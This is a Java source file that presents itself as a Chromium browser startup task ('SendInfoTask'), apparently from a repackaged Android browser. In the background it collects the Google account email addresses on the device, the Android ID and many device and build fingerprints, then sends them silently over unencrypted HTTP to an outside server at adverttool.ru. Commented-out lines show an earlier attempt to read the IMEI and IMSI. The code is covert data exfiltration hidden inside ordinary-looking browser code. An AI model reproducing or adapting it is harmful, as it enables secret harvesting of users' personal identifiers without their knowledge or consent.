package org.chromium.chrome.browser.init.tasks;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.Settings;
import org.chromium.base.Log;
import org.chromium.chrome.browser.coins.CoinsSingleton;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

/**
 * Created by elvis on 05.01.17.
 */
public class SendInfoTask extends AsyncTask<Void, Void, Void> {
    public static final String URL_ADD_INFO = "http://adverttool.ru/addinfo.php";
    private Context context;

    public SendInfoTask(Context context) {
        this.context = context;
    }

    @Override
    protected Void doInBackground(Void... voids) {
        Log.i("SendInfoTask", "Send info");

//        String serviceName = Context.TELEPHONY_SERVICE;
//        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(serviceName);
//        String IMEI,IMSI;
//        IMEI = telephonyManager.getDeviceId();
//        IMSI = telephonyManager.getSubscriberId();



        try {
            String urlParameters =
                    "id=" + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)
                    + "&info=" + collectInfo()
                    + "&coins=" + CoinsSingleton.getInstance().getValue();

            Log.i("SendInfoTask", "Send info" + urlParameters);
            byte[] postData = urlParameters.getBytes("UTF8");
            int postDataLength = postData.length;

            URL url = new URL(URL_ADD_INFO);

            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Content-Length", Integer.toString(postDataLength));
            connection.setUseCaches(false);

            OutputStream outputStream = connection.getOutputStream();
            DataOutputStream wr = new DataOutputStream(outputStream);
            wr.write(postData);
            wr.flush();
            wr.close();
            outputStream.close();
            connection.connect();
            connection.getInputStream().close();
            connection.disconnect();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    private String collectInfo() {
        StringBuilder info = new StringBuilder();

        Account[] accounts = AccountManager.get(context).getAccountsByType("com.google");
        if (accounts.length > 0) {
            info.append("email=");
            for (Account account : accounts) {
                info.append(account.name).append(",");
            }
            info.append(";");
        }


        info.append("uniqueid=").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)).append(";");

        info.append("Board=").append(android.os.Build.BOARD).append(";");
        info.append("Brand=").append(android.os.Build.BRAND).append(";");
        info.append("Device=").append(android.os.Build.DEVICE).append(";");
        info.append("Product=").append(android.os.Build.PRODUCT).append(";");
        info.append("TAGS=").append(Build.TAGS).append(";");

        info.append("OS BUILD=").append(Build.DISPLAY).append("(").append(Build.VERSION.INCREMENTAL).append(");");
        info.append("OS Finger print=").append(Build.FINGERPRINT).append(";");
        info.append("OS Build ID=").append(Build.ID).append(";");


        return info.toString();
    }


}
